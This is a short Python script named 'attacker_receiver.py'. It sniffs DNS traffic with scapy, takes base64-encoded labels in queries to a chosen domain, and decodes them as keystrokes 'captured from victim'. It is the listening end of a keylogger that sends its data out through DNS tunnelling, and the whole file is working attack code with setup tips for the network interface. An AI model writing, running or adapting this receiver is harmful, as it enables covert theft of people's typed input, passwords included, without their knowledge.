# UPDATED attacker_receiver.py
from scapy.all import sniff, DNS, DNSQR, get_if_list
import base64

TARGET_DOMAIN = "test.google.com"

def decode_covert_traffic(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        if packet.haslayer(DNSQR):
            query = packet[DNSQR].qname.decode('utf-8')
            if TARGET_DOMAIN in query:
                try:
                    encoded_data = query.split(f".{TARGET_DOMAIN}")[0]
                    missing_padding = len(encoded_data) % 4
                    if missing_padding:
                        encoded_data += '=' * (4 - missing_padding)
                    decoded_keystrokes = base64.urlsafe_b64decode(encoded_data).decode('utf-8')
                    print(f"[+] CAPTURED FROM VICTIM: {decoded_keystrokes}")
                    print(f"    (Raw Query: {query})")
                except Exception as e:
                    print(f"[-] Decode error: {query} | {e}")

# Print available interfaces
print("[*] Available network interfaces:")
for iface in get_if_list():
    print(f"    - {iface}")

# IMPORTANT: Specify the correct interface
# Common names: eth0, ens33, enp0s3, vboxnet0
INTERFACE = "eth0"  # ⚠️ CHANGE THIS TO YOUR INTERNAL NETWORK INTERFACE

print(f"\n[*] Listening on interface: {INTERFACE}")
print(f"[*] Filtering for DNS queries to *.{TARGET_DOMAIN}...\n")

# Sniff on specific interface
sniff(iface=INTERFACE, filter="udp port 53", prn=decode_covert_traffic, store=0)
